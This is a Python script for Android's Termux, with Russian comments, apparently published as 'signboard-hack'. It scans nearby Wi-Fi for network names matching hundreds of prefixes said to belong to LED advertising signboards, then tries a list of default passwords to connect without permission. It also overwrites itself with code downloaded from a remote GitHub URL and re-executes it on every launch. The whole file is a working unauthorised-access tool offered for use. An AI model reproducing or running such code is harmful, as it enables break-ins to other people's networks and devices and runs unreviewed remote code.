import os
import time
import subprocess
import json
import sys
import hashlib
import requests
import re
from threading import Thread
import getpass
from urllib.parse import quote

# ===== КОНФИГУРАЦИЯ =====
TARGET_PREFIXES = [
    # Основные префиксы вывесок
    "A5L", "A6L", "B6L", "H4K", "H8", "H6", "B8L", "A7", "A8", "A3",
    "A4", "A5", "A6", "C16L", "C08L", "C16", "C15", "C35", "D16", "D36",
    "D15", "D35", "C36", "Q910", "B6", "D10", "D20", "D30", "C10", "C30",
    "A30", "A30+", "A601", "A602", "A603", "A604", "A605", "A606", "A607",
    
    # Префиксы на V и M
    "V10", "V20", "V30", "V40", "V50", "V60", "M10", "M20", "M30", "M40",
    "M50", "M60", "MV10", "MV20", "MV30", "MV40", "VM10", "VM20", "VM30",
    
    # Префиксы на W (все возможные комбинации)
    "W00", "W01", "W02", "W03", "W04", "W05", "W06", "W07", "W08", "W09",
    "W10", "W11", "W12", "W13", "W14", "W15", "W16", "W17", "W18", "W19",
    "W20", "W21", "W22", "W23", "W24", "W25", "W26", "W27", "W28", "W29",
    "W30", "W31", "W32", "W33", "W34", "W35", "W36", "W37", "W38", "W39",
    "W40", "W41", "W42", "W43", "W44", "W45", "W46", "W47", "W48", "W49",
    "W50", "W51", "W52", "W53", "W54", "W55", "W56", "W57", "W58", "W59",
    "W60", "W61", "W62", "W63", "W64", "W65", "W66", "W67", "W68", "W69",
    "W70", "W71", "W72", "W73", "W74", "W75", "W76", "W77", "W78", "W79",
    "W80", "W81", "W82", "W83", "W84", "W85", "W86", "W87", "W88", "W89",
    "W90", "W91", "W92", "W93", "W94", "W95", "W96", "W97", "W98", "W99",
    "W2", "W3", "W4", "W5", "W6", "W7", "W8", "W9",  # Дополнительные короткие
    
    # Другие распространенные префиксы
    "P10", "P16", "P20", "P25", "P30", "P40", "P50", "P60", "P80", "P100",
    "S10", "S20", "S30", "S40", "S50", "S60", "S70", "S80", "S90",
    "T10", "T20", "T30", "T40", "T50", "T60", "T70", "T80", "T90",
    "R10", "R20", "R30", "R40", "R50", "R60", "R70", "R80", "R90",
    "F10", "F20", "F30", "F40", "F50", "F60", "F70", "F80", "F90",
    "G10", "G20", "G30", "G40", "G50", "G60", "G70", "G80", "G90",
    
    # Короткие цифровые префиксы
    "100", "200", "300", "400", "500", "600", "700", "800", "900",
    "101", "202", "303", "404", "505", "606", "707", "808", "909",
    "110", "220", "330", "440", "550", "660", "770", "880", "990",
    
    # Специальные префиксы
    "LCD", "LED", "SMD", "RGB", "OLED", "QLED", "DISP", "SCRN", "BRD", "SIGN",
    "ADV", "ADS", "PUB", "OUT", "IN", "SHOP", "STORE", "MALL", "HOTEL", "CAFE",
    
    # Префиксы для тестирования
    "Kyivstar", "KyivStar", "KYIVSTAR"  # Добавлено для тестирования
]

PASSWORD_LIST = [
    "88888888", "888888eu", "12345678", "87654321",
    "00000000", "11111111", "admin123"
]
SCAN_INTERVAL = 15  # Быстрое сканирование
PASSWORD = "k33rooxx"
REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
# ========================

def print_keerooxx():
    """Печатаем красивый ASCII-арт для keerooxx"""
    print(r"""
 ██ ▄█▀▓█████  ██▀███   ▒█████  ▒██   ██▒
 ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░
▓███▄░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░
▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ 
▒██▒ █▄░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒   ░    ░  
░  ░      ░  ░   ░         ░ ░   ░    ░  
    """)

def auto_update():
    """Автоматическое обновление скрипта с авто-перезапуском"""
    try:
        print("[~] Проверка обновлений...")
        response = requests.get(REPO_URL + "?t=" + str(time.time()))
        if response.status_code != 200:
            print(f"[!] Ошибка проверки обновлений: {response.status_code}")
            return False
        
        current_hash = hashlib.md5(open(__file__, 'rb').read()).hexdigest()
        new_hash = hashlib.md5(response.content).hexdigest()
        
        if current_hash == new_hash:
            print("[✓] У вас последняя версия скрипта")
            return False
        
        print("[~] Найдено обновление, устанавливаем...")
        with open(__file__, 'wb') as f:
            f.write(response.content)
        
        print("[✓] Скрипт успешно обновлен!")
        print("[~] Перезапускаю скрипт...")
        
        # Автоматический перезапуск
        os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
        
    except Exception as e:
        print(f"[!] Ошибка обновления: {e}")
        return False

def check_password():
    """Проверка пароля без отображения в консоли"""
    print("[!] Для запуска требуется пароль")
    
    try:
        import getpass
        user_input = getpass.getpass("Введите пароль: ")
    except:
        print("[!] Внимание: пароль будет виден при вводе!")
        user_input = input("Введите пароль: ")
    
    return user_input.strip() == PASSWORD

def is_target_network(ssid):
    """Улучшенная проверка префиксов"""
    # Проверяем форматы вида WXX_XXXX
    if re.match(r"^W\d{2}_", ssid):
        return True
    
    # Проверяем обычные префиксы
    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)

def try_connect(ssid, password):
    """Попытка подключения через Intent (без root)"""
    try:
        # Кодируем спецсимволы в SSID
        encoded_ssid = quote(ssid, safe='')
        
        result = subprocess.run(
            ["am", "start", "-a", "android.intent.action.VIEW", 
             "-d", f"wifi://{encoded_ssid}/{password}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10
        )
        
        # Проверяем успешность выполнения команды
        return result.returncode == 0
    except:
        return False

def test_password(ssid, password):
    """Тестирование одного пароля с визуальной обратной связью"""
    print(f"    [>] Проверка: {password}")
    if try_connect(ssid, password):
        print(f"    [✓] Успех! Пароль: {password}")
        return True
    return False

def hack_network(ssid):
    """Автоматический подбор паролей"""
    print(f"\n[+] Найдена вывеска: {ssid}")
    print(f"[!] Начинаю проверку паролей...")
    
    success = False
    for password in PASSWORD_LIST:
        if test_password(ssid, password):
            success = True
            break
    
    if success:
        print(f"\n[!] УСПЕХ! Подключено к {ssid}")
        try:
            subprocess.run(["termux-beep", "-f", "1000", "-d", "1000"])
        except:
            pass
    else:
        print("\n[✗] Не удалось подключиться")

def fast_scan_wifi():
    """Быстрое сканирование Wi-Fi сетей"""
    try:
        result = subprocess.check_output(
            ["termux-wifi-scaninfo"],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=10
        )
        return result
    except Exception as e:
        print(f"[!] Ошибка сканирования: {e}")
        return ""

def parse_networks(scan_result):
    """Парсим результат сканирования сетей"""
    try:
        networks = json.loads(scan_result)
        return [net["ssid"] for net in networks if "ssid" in net and net["ssid"]]
    except:
        return []

def main():
    # Автоматическое обновление при запуске
    if "--no-update" not in sys.argv:
        auto_update()
    
    # Печатаем логотип
    print_keerooxx()
    print("Wi-Fi Scanner Tool | Termux Edition")
    print("Telegram: @krx1krx")
    print("======================================")
    
    # Проверка пароля
    if not check_password():
        print("[!] Неверный пароль! Доступ запрещен.")
        return
    
    print("[✓] Вход выполнен успешно")
    print(f"[*] Режим: быстрое сканирование (каждые {SCAN_INTERVAL} сек)")
    print("[*] Автоматическая проверка паролей включена")
    
    # Получаем местоположение
    try:
        response = requests.get('https://ipinfo.io/json', timeout=5)
        data = response.json()
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        print(f"[*] Ваше местоположение: {city}, {region}")
    except:
        print("[*] Не удалось определить местоположение")
    
    print(f"[*] Ищем вывески ({len(TARGET_PREFIXES)} префиксов)")
    print(f"[*] Тестируемые пароли: {', '.join(PASSWORD_LIST)}")
    print("\n[!] Нажмите Ctrl+C для остановки")
    print("[!] Для отключения автообновления: python scanner.py --no-update")
    print(f"[!] Для теста: рядом должна быть сеть с префиксом 'Kyivstar'\n")
    
    # Звуковой сигнал старта
    try:
        subprocess.run(["termux-beep"], timeout=2)
    except:
        pass
    
    last_scan = time.time()
    try:
        while True:
            # Ускоренное сканирование
            scan_result = fast_scan_wifi()
            
            if scan_result:
                networks = parse_networks(scan_result)
                unique_networks = list(set(networks))
                
                print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
                
                # Отображаем первые 5 сетей для тестирования
                if unique_networks:
                    print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
                          ("..." if len(unique_networks) > 5 else ""))
                
                for ssid in unique_networks:
                    if ssid and is_target_network(ssid):
                        print(f"[+] Обнаружена целевая сеть: {ssid}")
                        # Запускаем проверку паролей в отдельном потоке
                        Thread(target=hack_network, args=(ssid,), daemon=True).start()
            
            # Ожидание до следующего сканирования
            sleep_time = SCAN_INTERVAL - (time.time() - last_scan)
            if sleep_time > 0:
                time.sleep(sleep_time)
            last_scan = time.time()
            
    except KeyboardInterrupt:
        print("\n[!] Программа остановлена")
    except Exception as e:
        print(f"[!] Критическая ошибка: {e}")

if __name__ == "__main__":
    # Проверка разрешений
    print("[~] Запрос необходимых разрешений...")
    subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, timeout=5)
    main()
    
